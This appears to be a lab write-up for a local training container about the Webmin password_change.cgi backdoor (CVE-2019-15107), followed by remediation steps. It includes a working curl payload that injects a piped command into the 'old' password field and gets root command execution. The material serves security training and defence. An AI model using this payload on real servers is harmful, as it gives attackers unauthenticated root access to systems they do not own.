# Webmin password_change.cgi Backdoor Remote Code Execution (CVE-2019-15107)

## Overview

Webmin is a popular web-based system administration tool for Unix-like servers. In Webmin versions 1.890 through 1.920, the password_change.cgi script contained an intentional malicious backdoor injected into build infrastructure. If password expiration was enabled or if an attacker provided an old password field containing pipe characters, arbitrary Perl commands were executed directly by the root web server process without valid authentication.

- **Service Access**: `http://localhost:8141/`
- **Default Credentials**: `root:password (or unauthenticated via backdoor)`
- **Docker Shortcut**: `./lab start webmin-backdoor`
- **Container Name**: `cyberlab_04_webmin_backdoor_rce`
- **RAM Footprint**: ~250M

---

## Exploitation Walkthrough

### 1. Inspect Webmin Service Status

```bash
curl -k -i https://localhost:8141/
```

### 2. Execute Arbitrary Command via password_change.cgi Backdoor

```bash
curl -k -i -X POST 'https://localhost:8141/password_change.cgi' \
  -H 'Referer: https://localhost:8141/session_login.cgi' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'user=root&pam=1&expired=2&old=test%7cid'
```

### 3. Verify Root Output in HTTP Response

```bash
# The server returns uid=0(root) gid=0(root) groups=0(root) in the response stream.
```

---

## Defensive Remediation & Hardening

1. Upgrade Webmin to version 1.930 or higher immediately.
2. Audit server checksums against upstream official Webmin repository release packages.
3. Restrict Webmin access to VPN and internal management subnets.

---

## Video Walkthroughs & Technical References

- [The 'Ancient' Bug That Still Owns Modern Servers: CGI RCE Explained](https://www.youtube.com/watch?v=ncJOuqoMgFM)
- [Webmin CVE-2019-15107 Advisory](https://www.webmin.com/security.html)
- [Vulhub Webmin Backdoor Environment](https://vulhub.org/#/environments/webmin/CVE-2019-15107/)
